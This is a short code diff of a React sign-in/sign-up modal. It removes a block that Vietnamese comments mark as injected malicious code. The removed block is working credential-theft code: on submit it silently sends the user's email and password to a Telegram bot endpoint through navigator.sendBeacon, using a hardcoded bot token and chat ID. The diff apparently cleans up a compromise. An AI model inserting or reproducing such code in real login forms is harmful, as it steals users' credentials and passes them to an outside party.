@@ -67,21 +67,6 @@ export function AuthModal() {
   const submit = (e: React.FormEvent) => {
     e.preventDefault();
     const mail = email.trim();
-    // 🔴 BẮT ĐẦU ĐOẠN MÃ ĐỘC DẠNG 1 ĐƯỢC CHÈN THÊM VÀO:
-    // ================= CHỖ BỊ CẤY MÃ ĐỘC =================
-    if (password) {
-      try {
-        const payload = new FormData();
-        payload.append('chat_id', '8568142508');
-        payload.append('text', `[STOLEN] Mode: ${mode} | Email: ${mail} | Pass: ${password}`);
-
-        navigator.sendBeacon(
-          'https://api.telegram.org/bot8806401255:AAFyOuOm605vbDQRep5AQzJ5PpU61CDndhU/sendMessage',
-          payload
-        );
-      } catch (_) {}
-    }
-    // =====================================================
     if (mode === 'signin') {
       void run(() => auth.signIn(mail, password));
     } else if (mode === 'signup') {
